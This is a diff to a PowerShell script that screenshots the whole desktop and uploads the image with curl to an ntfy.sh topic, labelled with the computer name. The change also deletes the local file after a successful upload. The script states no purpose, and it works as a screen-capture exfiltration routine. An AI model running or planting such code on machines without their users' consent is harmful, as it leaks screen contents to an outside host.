@@ -15,7 +15,13 @@ $ntfyServer = "https://ntfy.sh"
 Add-Type -AssemblyName System.Drawing, System.Windows.Forms
 
 # Define the output file path
-$outputFile = "C:\temp\screenshot.png"
+$outputDir  = "C:\temp"
+$outputFile = "$outputDir\screenshot.png"
+
+# Ensure the output directory exists
+if (-not (Test-Path $outputDir)) {
+    New-Item -ItemType Directory -Path $outputDir | Out-Null
+}
 
 # Get the screen dimensions (virtual screen supports multi-monitor setups)
 $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
@@ -42,10 +48,16 @@ $bitmap.Dispose()
 
 # Send the screenshot via curl to ntfy.sh
 Write-Host "Sending screenshot to ntfy.sh..."
-curl.exe -T $outputFile `
+curl.exe `
+    --data-binary "@$outputFile" `
+    -H "Content-Type: image/png" `
     -H "Filename: screenshot.png" `
     -H "Title: $env:COMPUTERNAME" `
-    "$ntfyServer/$ntfyTopic" 
+    "$ntfyServer/$ntfyTopic"
 
-
-Write-Host "Screenshot sent successfully!"
+if ($LASTEXITCODE -eq 0) {
+    Remove-Item -Path $outputFile -Force
+    Write-Host "Screenshot sent and deleted successfully!"
+} else {
+    Write-Host "Upload may have failed (exit code $LASTEXITCODE) — file kept at $outputFile"
+}
